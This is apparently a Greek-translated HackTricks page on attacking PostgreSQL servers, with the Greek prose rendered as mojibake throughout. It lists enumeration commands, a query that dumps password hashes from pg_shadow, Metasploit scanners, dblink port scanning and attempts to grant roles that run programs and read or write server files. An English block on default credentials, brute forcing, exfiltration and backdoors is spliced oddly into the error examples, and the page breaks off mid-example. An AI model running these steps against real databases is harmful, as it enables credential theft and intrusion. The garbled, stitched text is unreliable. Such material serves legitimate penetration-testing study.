# 5432,5433 - Î•Î»Î­Î³Ï‡Î¿Ï‚ Î•Î¹ÏƒÎ²Î¿Î»Î®Ï‚ ÏƒÏ„Î¿ PostgreSQL

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î± ÎºÎ±Î¹ Î½Î± **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Î¼Îµ Ï„Î± Ï€Î¹Î¿ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï„Î·Ï‚ ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚.\
Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎ®Î¼ÎµÏÎ±:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î·Î½ ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs** ÏƒÏ„Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ Ï„Î¿Ï… [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ÏƒÏ„Î¿ GitHub.

</details>

## **Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

Î¤Î¿ **PostgreSQL** Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ Ï‰Ï‚ Î­Î½Î± **ÏƒÏÏƒÏ„Î·Î¼Î± Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼ÎµÎ½Î¿ÏƒÏ„ÏÎ±Ï†Î­Ï‚** Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ **Î±Î½Î¿Î¹ÎºÏ„Î¿Ï ÎºÏÎ´Î¹ÎºÎ±**. Î‘Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± ÏŒÏ‡Î¹ Î¼ÏŒÎ½Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î· Î³Î»ÏÏƒÏƒÎ± SQL Î±Î»Î»Î¬ Ï„Î·Î½ ÎµÎ½Î¹ÏƒÏ‡ÏÎµÎ¹ ÎºÎ±Î¹ Î¼Îµ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÎ¬. ÎŸÎ¹ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î­Ï‚ Ï„Î¿Ï… Ï„Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Î½Î± Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Î¼Î¹Î± Î¼ÎµÎ³Î¬Î»Î· Ï€Î¿Î¹ÎºÎ¹Î»Î¯Î± Ï„ÏÏ€Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½, ÎºÎ¬Î½Î¿Î½Ï„Î¬Ï‚ Ï„Î¿ Î¼Î¹Î± ÎµÏ…Î­Î»Î¹ÎºÏ„Î· ÎµÏ€Î¹Î»Î¿Î³Î® Î³Î¹Î± Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ ÎºÎ±Î¹ Î¿ÏÎ³Î±Î½Î¹ÏƒÎ¼Î¿ÏÏ‚.

**Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î¸ÏÏÎ±:** 5432, ÎºÎ±Î¹ Î±Î½ Î±Ï…Ï„Î® Î· Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î®Î´Î· ÏƒÎµ Ï‡ÏÎ®ÏƒÎ·, Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Ï„Î¿ postgresql Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· Î¸ÏÏÎ± (Ï€Î¹Î¸Î±Î½ÏŒÏ„Î±Ï„Î± Ï„Î·Î½ 5433) Ï€Î¿Ï… Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Î£ÏÎ½Î´ÎµÏƒÎ· & Î’Î±ÏƒÎ¹ÎºÎ® Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Î•Î¬Î½ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® **`\list`** ÎºÎ±Î¹ Î²ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± **`rdsadmin`**, Ï„ÏŒÏ„Îµ Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ ÏŒÏ„Î¹ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ **AWS PostgreSQL**.
{% endhint %}

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ **Ï€ÏÏ‚ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î¼Î¹Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ PostgreSQL**, ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î· Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ·
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Î§Ï…Î´Î±Î¯Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ·**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Î£Î¬ÏÏ‰ÏƒÎ· Î¸Ï…ÏÏÎ½**

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î­ÏÎµÏ…Î½Î±**](https://www.exploit-db.com/papers/13084), ÏŒÏ„Î±Î½ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î±Ï€Î¿Ï„Ï…Î³Ï‡Î¬Î½ÎµÎ¹, Ï„Î¿ `dblink` ÎµÎºÏ„Î¿Î¾ÎµÏÎµÎ¹ Î¼Î¹Î± ÎµÎ¾Î±Î¯ÏÎµÏƒÎ· `sqlclient_unable_to_establish_sqlconnection` Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± ÎµÎ¾Î®Î³Î·ÏƒÎ· Ï„Î¿Ï… ÏƒÏ†Î¬Î»Î¼Î±Ï„Î¿Ï‚. Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¹ÏÎ½ Ï€Î±ÏÎ±Ï„Î¯Î¸ÎµÎ½Ï„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* ÎŸ Î¦Î¹Î»Î¿Î¾ÎµÎ½Î·Ï„Î®Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÎºÏ„ÏŒÏ‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚

```DETAIL: Î´ÎµÎ½ Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„Î® Î· ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®: Î”ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î´Î¹Î±Î´ÏÎ¿Î¼Î® Î³Î¹Î± Ï„Î¿Î½ Ï†Î¹Î»Î¿Î¾ÎµÎ½Î·Ï„Î®. Î•ÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ ÏƒÏ„Î¿Î½ Ï†Î¹Î»Î¿Î¾ÎµÎ½Î·Ï„Î® "1.2.3.4" ÎºÎ±Î¹ Î´Î­Ï‡ÎµÏ„Î±Î¹ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ TCP/IP ÏƒÏ„Î· Î¸ÏÏÎ± 5678;```

* Î— Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ ÎºÎ»ÎµÎ¹ÏƒÏ„Î®
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Î— Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î±Î½Î¿Î¹Ï‡Ï„Î®
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
```markdown
## PostgreSQL

### Enumeration

To discover PostgreSQL services running on the target system, you can use tools like Nmap or Metasploit. Nmap can be used to scan for open ports, while Metasploit can help in identifying vulnerabilities in the PostgreSQL service.

### Default Credentials

PostgreSQL has default credentials that are commonly used. Some of the default credentials include:

- Username: postgres, Password: postgres
- Username: postgres, Password: (blank)
- Username: admin, Password: admin

### Brute Forcing

If default credentials do not work, you can attempt to brute force the PostgreSQL login using tools like Hydra or Metasploit. These tools can help you in trying a list of common passwords against the PostgreSQL service.

### Exploitation

Once you have valid credentials or have successfully brute forced the login, you can exploit vulnerabilities in the PostgreSQL service to gain unauthorized access to the database. This can include SQL injection attacks or privilege escalation techniques.

### Post-Exploitation

After gaining access to the database, you can perform various post-exploitation activities such as exfiltrating data, creating backdoors, or even deleting data to cover your tracks.
```
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Î¤Î¿ Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î±Î½Î¿Î¹Ï‡Ï„Î® Î® Ï†Î¹Î»Ï„ÏÎ±ÏÎ¹ÏƒÎ¼Î­Î½Î·
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
## Î‘Ï€Î±ÏÎ¯Î¸Î¼Î·ÏƒÎ· Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½

### Î¡ÏŒÎ»Î¿Î¹

| Î¤ÏÏ€Î¿Î¹ Î¡ÏŒÎ»Ï‰Î½   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | ÎŸ ÏÏŒÎ»Î¿Ï‚ Î­Ï‡ÎµÎ¹ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„Î·                                                                                                                |
| rolinherit     | ÎŸ ÏÏŒÎ»Î¿Ï‚ ÎºÎ»Î·ÏÎ¿Î½Î¿Î¼ÎµÎ¯ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï„Ï‰Î½ ÏÏŒÎ»Ï‰Î½ ÏƒÏ„Î¿Ï…Ï‚ Î¿Ï€Î¿Î¯Î¿Ï…Ï‚ ÎµÎ¯Î½Î±Î¹ Î¼Î­Î»Î¿Ï‚                                                                      |
| rolcreaterole  | ÎŸ ÏÏŒÎ»Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚                                                                                             |
| rolcreatedb    | ÎŸ ÏÏŒÎ»Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½                                                                                                  |
| rolcanlogin    | ÎŸ ÏÏŒÎ»Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯. Î”Î·Î»Î±Î´Î®, Î±Ï…Ï„ÏŒÏ‚ Î¿ ÏÏŒÎ»Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¿Î¸ÎµÎ¯ Ï‰Ï‚ Î±ÏÏ‡Î¹ÎºÏŒ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±Ï‚                    |
| rolreplication | ÎŸ ÏÏŒÎ»Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ ÏÏŒÎ»Î¿Ï‚ Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®Ï‚. ÎˆÎ½Î±Ï‚ ÏÏŒÎ»Î¿Ï‚ Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÎ¹ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®Ï‚ ÎºÎ±Î¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï…Ï€Î¿Î´Î¿Ï‡Î­Ï‚ Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®Ï‚. |
| rolconnlimit   | Î“Î¹Î± ÏÏŒÎ»Î¿Ï…Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ½, Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ Î¼Î­Î³Î¹ÏƒÏ„Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Ï‰Î½ ÏƒÏ…Î½Î´Î­ÏƒÎµÏ‰Î½ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Î±Ï…Ï„ÏŒÏ‚ Î¿ ÏÏŒÎ»Î¿Ï‚. Î¤Î¿ -1 ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÏŒÏÎ¹Î¿. |
| rolpassword    | ÎŒÏ‡Î¹ Î¿ ÎºÏ‰Î´Î¹ÎºÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ (Î´Î¹Î±Î²Î¬Î¶ÎµÏ„Î±Î¹ Ï€Î¬Î½Ï„Î± Ï‰Ï‚ `********`)                                                                                           |
| rolvaliduntil  | Î§ÏÏŒÎ½Î¿Ï‚ Î»Î®Î¾Î·Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ Î³Î¹Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÏ‰Î´Î¹ÎºÎ¿Ï); null Î±Î½ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î»Î®Î¾Î·                                                |
| rolbypassrls   | ÎŸ ÏÏŒÎ»Î¿Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ ÎºÎ¬Î¸Îµ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… Î³ÏÎ±Î¼Î¼Î®Ï‚, Î´ÎµÎ¯Ï„Îµ [Î•Î½ÏŒÏ„Î·Ï„Î± 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚. |
| rolconfig      | Î ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ ÏÏŒÎ»Î¿Ï… Î³Î¹Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚ ÎºÎ±Ï„Î¬ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·                                                                                      |
| oid            | ID Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï…                                                                                                                                       |

#### Î•Î½Î´Î¹Î±Ï†Î­ÏÎ¿Ï…ÏƒÎµÏ‚ ÎŸÎ¼Î¬Î´ÎµÏ‚

* Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î¿Ï… **`pg_execute_server_program`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ** Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î±
* Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î¿Ï… **`pg_read_server_files`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ** Î±ÏÏ‡ÎµÎ¯Î±
* Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î¿Ï… **`pg_write_server_files`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î³ÏÎ¬ÏˆÎµÏ„Îµ** Î±ÏÏ‡ÎµÎ¯Î±

{% hint style="info" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÏ„Î¿ Postgres Î­Î½Î±Ï‚ **Ï‡ÏÎ®ÏƒÏ„Î·Ï‚**, Î¼Î¹Î± **Î¿Î¼Î¬Î´Î±** ÎºÎ±Î¹ Î­Î½Î±Ï‚ **ÏÏŒÎ»Î¿Ï‚** ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **Î¯Î´Î¹Î¿**. Î‘Ï€Î»Î¬ ÎµÎ¾Î±ÏÏ„Î¬Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿ **Ï€Î¿Ï… Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ** ÎºÎ±Î¹ Î±Î½ Ï„Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Îµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Î Î¯Î½Î±ÎºÎµÏ‚
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Î£Ï…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Î•Î½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î±ÏÏ‡ÎµÎ¯Ï‰Î½

### Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ ÎºÎ±Ï„Î±Î»ÏŒÎ³Î¿Ï…Ï‚ ÎºÎ±Î¹ Î±ÏÏ‡ÎµÎ¯Î±

Î‘Ï€ÏŒ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ [**Î±Î»Î»Î±Î³Î®**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) Î¼Î­Î»Î· Ï„Î·Ï‚ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ **`DEFAULT_ROLE_READ_SERVER_FILES`** (Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **`pg_read_server_files`**) ÎºÎ±Î¹ **Ï…Ï€ÎµÏÏ‡ÏÎ®ÏƒÏ„ÎµÏ‚** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ **`COPY`** ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î´Î¹Î±Î´ÏÎ¿Î¼Î® (ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿ `convert_and_check_filename` ÏƒÏ„Î¿ `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
